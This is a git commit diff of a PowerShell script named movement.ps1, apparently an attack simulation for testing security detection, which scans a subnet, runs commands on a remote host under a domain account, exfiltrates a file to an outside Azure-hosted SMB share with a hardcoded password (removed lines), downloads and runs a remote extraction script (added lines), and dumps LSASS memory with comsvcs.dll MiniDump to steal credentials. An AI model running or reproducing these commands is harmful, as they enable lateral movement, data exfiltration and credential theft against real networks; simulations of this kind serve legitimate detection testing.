e58852d039b23e293403e066f4e5235f33799c81
bassmandan <daniel@thehardingfamily.org.uk>
2024-12-13 13:32:41 +0000

    Update movement.ps1

--- movement.ps1
+++ movement.ps1
@@ -20,17 +20,11 @@ Install-Module -Name PSnmap -Scope CurrentUser -Force
 # Run NMap scan on firewalled subnet
 Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService
 
-# Print hostname of remote device
-Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {$env:computername}
+# Download file extract script
+Invoke-WebRequest https://raw.githubusercontent.com/bassmandan/poc-scripts/refs/heads/main/file_extract.ps1 -OutFile C:\ProgramData\file_extract.ps1
 
-
-
-# Exfiltrate file
-# Create new file share link
-Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'}
-# Copy temp file to remote share
-Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {copy 'C:\Temp\secret-data.txt' 'Z:\'}
-Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -ScriptBlock {Remove-SmbMapping -LocalPath 'Z:' -Force}
+# Run remote script
+Invoke-Command -ComputerName 10.200.200.70 -Credential securex.local\david.altass -FilePath C:\ProgramData\file_extract.ps1
 
 # Attempt credential theft
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
